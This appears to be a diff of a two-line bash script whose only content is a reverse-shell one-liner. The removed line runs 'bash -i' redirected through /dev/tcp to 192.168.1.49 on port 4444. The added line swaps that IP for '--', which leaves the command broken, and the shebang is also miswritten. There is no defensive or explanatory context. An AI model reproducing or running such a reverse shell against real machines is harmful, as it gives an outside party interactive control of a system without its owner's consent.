@@ -1,2 +1,2 @@
 #! bin/bash 
-bash -i >& /dev/tcp/192.168.1.49/4444 0>&1
+bash -i >& /dev/tcp/--/4444 0>&1
